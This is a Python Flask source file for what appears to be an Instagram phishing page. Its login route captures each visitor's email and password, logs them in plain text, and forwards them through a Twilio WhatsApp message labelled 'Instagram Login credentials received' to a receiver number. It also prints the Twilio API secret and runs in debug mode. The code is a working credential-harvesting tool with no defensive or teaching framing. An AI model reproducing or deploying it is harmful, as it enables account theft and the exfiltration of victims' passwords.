from dotenv import load_dotenv
load_dotenv()

from flask import Flask, render_template, request, flash, redirect, url_for
from twilio.rest import Client
import os
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)

app = Flask(__name__, template_folder="../templates")
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'default_secret_key')  # Use environment variable

# Dummy user credentials (replace with database or secure storage in production)
DUMMY_USER = {
    "email": "user@example.com",
    "password": "securepassword"
}

# Twilio credentials from environment variables (Using API Key for long-lived access)
TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')  # This is your real Twilio Account SID
TWILIO_API_KEY_SID = os.getenv('TWILIO_API_KEY_SID')  # API Key SID
TWILIO_API_KEY_SECRET = os.getenv('TWILIO_API_KEY_SECRET')  # API Key Secret
TWILIO_WHATSAPP_NUMBER = os.getenv('TWILIO_WHATSAPP_NUMBER')  # Replace with your actual env variable name
WHATSAPP_RECEIVER = os.getenv('WHATSAPP_RECEIVER')  # Replace with your actual env variable name

# Check if required credentials are available
# print(TWILIO_ACCOUNT_SID)
# print(TWILIO_API_KEY_SID)
print("TWILIO_ACCOUNT_SID:", os.getenv('TWILIO_ACCOUNT_SID'))
print("TWILIO_API_KEY_SID:", os.getenv('TWILIO_API_KEY_SID'))
print("TWILIO_API_KEY_SECRET:", os.getenv('TWILIO_API_KEY_SECRET'))
print("TWILIO_WHATSAPP_NUMBER:", os.getenv('TWILIO_WHATSAPP_NUMBER'))
print("WHATSAPP_RECEIVER:", os.getenv('WHATSAPP_RECEIVER'))


# Function to send a WhatsApp message
def send_whatsapp_message(user_email, user_password):
    if not all([TWILIO_ACCOUNT_SID, TWILIO_API_KEY_SID, TWILIO_API_KEY_SECRET, TWILIO_WHATSAPP_NUMBER, WHATSAPP_RECEIVER]):
        logging.error("Missing Twilio credentials or WhatsApp receiver number.")
        return

    # Use Twilio's API Key for authentication
    client = Client(TWILIO_API_KEY_SID, TWILIO_API_KEY_SECRET, TWILIO_ACCOUNT_SID)

    message_body = f"Instagram Login credentials received:\nEmail: {user_email}\nPassword: {user_password}"

    try:
        message = client.messages.create(
            body=message_body,
            from_=f'whatsapp:{TWILIO_WHATSAPP_NUMBER}',
            to=f'whatsapp:{WHATSAPP_RECEIVER}'
        )
        logging.info("WhatsApp message sent successfully.")
    except Exception as e:
        logging.error(f"Error sending WhatsApp message: {e}")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        logging.info(f"Received email: {email} and password: {password}")

        # Send credentials via WhatsApp
        send_whatsapp_message(email, password)

        # Validate login
        if email == DUMMY_USER["email"] and password == DUMMY_USER["password"]:
            flash("Login successful!", "success")
            return redirect(url_for("home"))
        else:
            flash("Invalid email or password. Please try again.", "error")
            return redirect(url_for("login"))

    return render_template("index.html")

@app.route("/")
def home():
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(debug=True)
